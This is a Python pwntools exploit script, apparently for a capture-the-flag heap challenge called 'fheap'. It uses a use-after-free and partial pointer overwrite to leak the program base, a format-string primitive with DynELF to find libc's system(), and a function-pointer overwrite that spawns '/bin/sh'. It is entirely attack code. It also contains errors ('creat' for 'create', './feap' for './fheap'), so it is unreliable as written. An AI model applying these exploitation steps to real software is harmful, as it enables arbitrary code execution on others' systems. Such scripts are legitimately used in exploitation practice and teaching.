#!/usr/bin/env python
#-*-coding:utf-8 -*-
from pwn import *
context(arch='amd64',os='linux',log_level='debug')

elf=ELF('./fheap')
io = process("./fheap")

def create(size,creat_str):
    io.recvuntil('3.quit')
    io.send('create string')
    io.recvuntil('size:')
    io.sendline(str(size))   
    io.recvuntil('str:')
    io.send(creat_str)   

def delete(str_id):
    io.recvuntil('3.quit')
    io.send('delete string')
    io.recvuntil('id:')
    io.sendline(str(str_id))   
    io.recvuntil('sure?:')
    io.send("yes") 

def leak_addr(addr):
    delete(0)
    payload = 'a%9$s'.ljust(0x18,'#') + p64(printf_addr)
    creat(0x20,payload)
    io.recvuntil('3.quit')
    io.sendline('delete string')   
    io.recvuntil('delete\nid:')
    io.sendline(str(1))
    io.recvuntil('sure?:')
    io.send("yes.1111"+p64(addr)+"\n")  
    io.recvuntil('a')
    data = io.recvuntil('####')[:-4]
    if len(data) == 0:
        return '\x00'
    if len(data) <= 8:
        print hex(u64(data.ljust(8,'\x00')))
    return data

create(4,"aa")
create(4,"bb")
delete(1)
delete(0)
create(0x20,'a'*0x14+'b'*4+'\x2d')
delete(1)
io.recvuntil('bbbb')
data=io.recvuntil('1.')[:-2]
if len(data)>8:
    data=data[:8]
data=u64(data.ljust(8,'\x00'))-0xA000000000000
proc_base=data-0xd2d
log.success("proc_base=>"+str(hex(proc_base)))
printf_addr=proc_base+elf.plt['printf']
delete(0)
create(0x20,'a'*0x14+'b'*4+'\x2d')
delete(1)  
d = DynELF(leak_addr, proc_base, elf=ELF('./feap'))
system_addr = d.lookup('system', 'libc')
print 'system_addr:'+hex(system_addr)
delete(0)
create(0x20,'/bin/sh;' + '#' * (0x18 - len('/bin/sh;')) + p64(system_addr))
delete(1)  
io.interactive()